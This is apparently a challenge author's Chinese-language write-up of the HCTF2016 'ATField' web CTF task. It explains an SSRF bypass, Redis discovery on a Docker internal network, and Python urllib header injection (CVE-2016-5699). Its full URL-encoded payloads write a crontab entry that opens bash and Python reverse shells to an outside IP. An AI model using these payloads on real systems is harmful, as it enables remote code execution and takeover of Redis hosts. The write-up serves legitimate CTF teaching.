---
title: HCTF2016 ATField writeup
date: 2016-11-29 20:30:05
tags:
- Blogs
- ctf
- hctf
categories:
- Blogs
---

出题的时候，主要思路是来源于2016wooyun峰会中猪猪侠的ppt，里面提到了很多关于ssrf的利用方式，而且国内其实对ssrf的研究并不多，所以一直有想法出一个这样的题，但是由于时间仓促再加上对flask的不熟悉，导致在出题的时候浪费了很多时间，而且还没能出得特别好。

[题目源码](https://github.com/LoRexxar/hctf2016_atfield)

由于出题的时候僵化，误解了所谓系统处理输出输入流的问题，所以一直以为ubuntu内核的centos不能正确处理，所以这里一直以为只能通过python来弹shell，由于python的shell应该默认为root...所以我在守题目的时候，每当看到正确的payload就先私聊希望不要搞事情，也做好了随时重启docker的准备，然后没想到的是:

天枢大佬用我以为不可用的payload拿到了shell，并搞了各种事情...还偷偷挂起了crontab（Orz...太菜了完全没发现这个问题）

这里给诸位大佬道歉Orz，

Nu1L的师傅、火日师傅、NSIS、FlappyPig的师傅在结束前应该是存在有效payload，Orz
<!--more-->

## 题目描述 ##

Welcome to ATField.

hint：
1: 在第一题里不只有flag，还有第二题的入口
2、扫端口没用，几百线程也没用的呀
3、我从来没说过，flag1那里没有别的东西啊
4、安nosql的服务器是centos
5、mdzz，没人注意到nosql的语法吗

## 解题逻辑 ##

AT Field1首先是很简单的ssrf绕过，绕过ssrf之后，大部分人都选择了扫127.0.0.1的端口，想找到本地开启的服务。

为了大家能在有限的时间里不浪费时间，我放出了前3条hint，之所以不想说的太明白，是因为出题的时候，认为这一步是需要扫目录的，在flag1的位置index.php那里，是通过git clone到本地的，虽然我删除了.git，但是却
遗留了README.md，在Readme中，我们获得了很多关于下一步的信息。

```

	11.23
	
	ak说上线的.git要都删了，以免被拖源码
	
	11.24
	
	听ak说nosql蛮好用的，link一个玩玩看
	
	11.25
	
	哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个

```

事实上，在这三句话中能获得信息远远超过你的想象...

首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到

其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息
1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务
2、docker的连接方式类似于内网，所以和题目并不在同一个docker
3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）
4、docker的默认用户是root

或许你可能没有得到那么多信息，那么稍后我们顺着题目思路，来看看这些条件是如何利用的

紧接着很快就能发现整个站是python的，而且请求图片是通过urllib方式，那么很自然的想到了python urllib httpheader注入。

国内主要是这两篇文章
[http://www.tuicool.com/articles/2iIj2eR](http://www.tuicool.com/articles/2iIj2eR)
[https://security.tencent.com/index.php/blog/msg/106](https://security.tencent.com/index.php/blog/msg/106)

由于redis写入的文件有莫名的头和尾，所以这里只有centos才能成功通过crontab来弹shell


这里先总结整个流程：
302->本机ssrf->内网->内网的redis->python urllib http头注入构造redis请求-->redis写入crontab->crontab定时执行getshell

整个题目最难的其实就是黑盒，因为全程你并不知道是不是写入成功了，所以想要提高成功率，必须在本地redis搭建成功

## writeup ##

### AT Field1 ###

整个题目打开是这样的
![](/img/hctf2016/1.png)

随便放个图片地址，发现返回了一张图片，

![](/img/hctf2016/2.png)

从这部分 很容易想到这里存在ssrf，那么问题就是如何过滤了。

稍微测试下，我们发现返回了

**NoNoNo, guys, Links must be accord with standard of .tld and contain domain name.**

这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式

1、http://www.127.0.0.1.xip.io

这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用

2、http://xxxxx/?u=http://127.0.0.1

在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题

### AT Field2 ###

到了这里，很容易误解认为要扫本机的服务，所以及时放出了3个提示

```
1: 在第一题里不只有flag，还有第二题的入口
2、扫端口没用，几百线程也没用的呀
3、我从来没说过，flag1那里没有别的东西啊
```

不能说提示有多明显吧，但是我相信从hint不难得出，在上一个flag所在页面，存在一些别的未知的文件，那么抄起扫目录的脚本，跑一跑，很快找到`http://127.0.0.1/README.md`

base64解码得到
```

	11.23
	
	ak说上线的.git要都删了，以免被拖源码
	
	11.24
	
	听ak说nosql蛮好用的，link一个玩玩看
	
	11.25
	
	哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个

```

事实上，在这三句话中能获得信息远远超过你的想象...

首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到

其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息
1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务
2、docker的连接方式类似于内网，所以和题目并不在同一个docker
3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）
4、docker的默认用户是root

首先我们根据拿到的提示扫内网，目标大概是192.168.0.1向上，端口为熟悉的nosql端口。注意这里有可能存在误区，因为通过link连入的docker内**不存在任何多余的服务**，所以22、80、8080端口都不可能开放！

其次就是，如果向redis服务端口发送数据，如果符合格式则会写入数据，如果不符合格式也不会有任何返回，如果向存在服务的端口发送数据的话，页面会因为**超时返回500**，但如果不存在，则会直接返回**urlopen error**

根据上面的信息爆破，很快就能得到redis位置**192.168.0.10/6379**

根据请求头，不难发现请求中ua为python的urllib

这里先推荐几篇文章
[https://security.tencent.com/index.php/blog/msg/106](https://security.tencent.com/index.php/blog/msg/106)

[http://www.tuicool.com/articles/2iIj2eR](http://www.tuicool.com/articles/2iIj2eR)

这里的python urllib header注入漏洞编号**CVE-2016-5699**，值得注意的是由于python的更新频率比较快，所以基本上已经很少有版本存在这个漏洞了，要求**python3 < 3.4.3 || python2 < 2.7.9**

而且，windows上会无效，提示geturlinfo error，至今不能肯定原因。

漏洞成因就不多赘述了，这里构造redis向crontab配置文件，写入

```
\n*/1 * * * * /bin/bash -i >& /dev/tcp/这里是ip/端口 0>&1\n

```

事实上，漏洞成因和底层系统同样有关，这里必须是centos才能成功写入crontab并执行，这里我们追踪一份payload来看看实现。

payload:
```
http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F你的ip%252f12345%25200%253E%25261%250a%250d%250aconfig%2520set%2520dir%2520%252Fvar%252Fspool%252Fcron%252F%250d%250aconfig%2520set%2520dbfilename%2520root%250d%250asave%250d%250a%3A6379%2f
```

请求经过跳转，经过一次urldecode，
```
http://192.168.0.10%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F你的ip%2f12344%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379/
```

然后urldecode进入redis

![](/img/hctf2016/3.png)

注意这里在redis中，只有0d0a可以被当作换行符

我发现我们将数据设置为1，并储存进入**/var/spool/cron/root**，写入内容为

![](/img/hctf2016/4.png)

写入文件的内容是这样的，前后被插入了特殊的数据

![](/img/hctf2016/5.png)

事实上，在其他系统中（类似于debian），这个配置文件有较为严格的格式要求，如果存在奇怪的数据，会导致命令执行失败。

还有一个特别的问题，redis中储存数据为键值对形式，所以其实把内容写入2，就不会覆盖了，我们来看看测试

![](/img/hctf2016/6.png)

![](/img/hctf2016/7.png)

成功了，事实上，hint5也就是因此存在的，我们成功拿到了反弹的shell


### 留在最后.... ###

由于在部分系统中，并不能正确的处理输入输出流，所以最开始的出题思路为python一句话弹shell，但是在复现过程中遇到了问题，假设我使用

```
http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%2524255%250d%250a%250A%252A%2f1%2520%252A%2520%252A%2520%252A%2520%252A%2520%2fusr%2fbin%2fpython%2520-c%2520%2527import%2520socket%252Csubprocess%252Cos%252Csys%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%2522115.28.78.16%2522%252C6666%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%2522%2fbin%2fsh%2522%252C%2522-i%2522%255D%2529%253B%2527%250A%250d%250aconfig%2520set%2520dir%2520%252Fvar%252Fspool%252Fcron%252F%250d%250aconfig%2520set%2520dbfilename%2520root%250d%250asave%250d%250a%3A6379%2f
```

写入redis为
![](/img/hctf2016/8.png)

但写入文件就成了
![](/img/hctf2016/9.png)

想知道是不是redis有什么坑...一直没搞明白，如果有大佬看懂麻烦回复我一下Orz